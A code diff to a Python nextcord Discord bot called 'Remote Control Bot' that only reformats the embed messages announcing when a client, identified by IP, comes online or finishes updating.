@@ -152,11 +152,13 @@ async def on_ready():
                     category = nextcord.utils.get(guild.categories, name=str(ip))
                     channel5 = nextcord.utils.get(category.text_channels, name="events")
 
-                    embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=f"Client updated to version v{tex}!")
+                    des = f"""Client {ip} updated to version v{tex}!
+                    Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}"""
+                    embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=f"Client updated to version v{tex}")
                     embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
                     await channel5.send(embed=embed)
 
-                    embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=f"Client {ip} updated to version v{tex}! Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}")
+                    embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=des)
                     embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
                     await channel13.send(embed=embed)
 
@@ -168,7 +170,9 @@ async def on_ready():
                         up2.write(tex)
                         up2.close()
 
-            embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d, description=f"Client {ip} is now online! Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}")
+            des = f"""Client {ip} is now online! 
+            Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}"""
+            embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d, description=des)
             embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
             await channel12.send(embed=embed)
             category = nextcord.utils.get(guild.categories, name=str(ip))
